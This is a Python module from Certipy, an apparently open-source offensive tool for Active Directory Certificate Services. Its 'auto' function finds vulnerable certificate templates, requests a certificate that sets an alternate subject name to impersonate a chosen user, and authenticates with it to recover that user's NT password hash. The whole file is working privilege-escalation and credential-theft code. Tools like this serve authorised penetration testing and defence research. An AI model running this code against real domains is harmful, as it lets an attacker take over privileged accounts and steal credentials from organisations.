# Certipy - Active Directory certificate abuse
#
# Description:
#   Automatically find and abuse vulnerable certificate templates for privilege
#   escalation.
#
# Authors:
#   @ly4k (https://github.com/ly4k)
#

import argparse
import copy
import logging

from certipy.auth import Authenticate
from certipy.dnsresolve import DnsResolver
from certipy.find import CertificateTemplate, EnrollmentService, Find
from certipy.request import Request
from certipy.target import Target


def auto(options: argparse.Namespace):
    # TODO: Implement ACL abuse

    user = options.user
    target = Target(options)
    options.vulnerable = None
    options.user = target.username
    find = Find(options, target=target)
    find.connect()

    resolver = DnsResolver(options, target)

    vuln_templates: set["CertificateTemplate"] = set()

    cas: list["EnrollmentService"] = find.enrollment_services
    templates: list["CertificateTemplate"] = find.certificate_templates

    for ca in cas:
        if ca.user_specifies_san:
            if templates is None:
                templates = find.certificate_templates

            for certificate_template in templates:
                if ca.ca_name not in certificate_template.cas:
                    continue

                if (
                    certificate_template.can_enroll
                    and certificate_template.has_authentication_eku
                    and not certificate_template.requires_manager_approval
                    and not certificate_template.authorized_signatures_required > 0
                ):
                    vuln_templates.add(certificate_template)
        else:
            for certificate_template in templates:
                if certificate_template.is_vulnerable and certificate_template.enabled:
                    vuln_templates.add(certificate_template)

    options.user = user
    if len(vuln_templates) == 0:
        logging.error("Could not find any vulnerable certificate templates")
        return

    found = False
    for template in vuln_templates:
        template_cas: list["EnrollmentService"] = template.cas
        for ca in cas:
            if ca.ca_name not in template_cas:
                continue

            logging.info(
                "Trying template %s with CA %s"
                % (repr(template.name), repr(ca.ca_name))
            )

            ca_target: Target = copy.deepcopy(target)
            remote_name = ca.dns_name
            target_ip = resolver.resolve(remote_name)

            ca_target.remote_name = remote_name
            ca_target.target_ip = target_ip

            options.alt = options.user
            options.ca = ca.ca_name
            options.template = template.name

            req = Request(options, ca_target)

            try:
                resp = req.run()
            except Exception as e:
                logging.error("Got error while requesting certificsate: %s" % e)

                continue

            if not resp:
                continue

            certificate = req.certificate
            key = req.key

            auth = Authenticate(options)
            try:
                auth.run(username=options.user, certificate=certificate, key=key)
            except Exception as e:
                logging.error("Got error while authenticating with certificate: %s" % e)
                if "KDC_ERR_CLIENT_REVOKED" in str(e):
                    logging.error(
                        "It is likely that %s is disabled" % repr(options.user)
                    )
                continue

            if auth.nt_password is not None:
                found = True
                break

        if found:
            break

    if found == False:
        logging.error("Failed to abuse any vulnerable certificate templates")
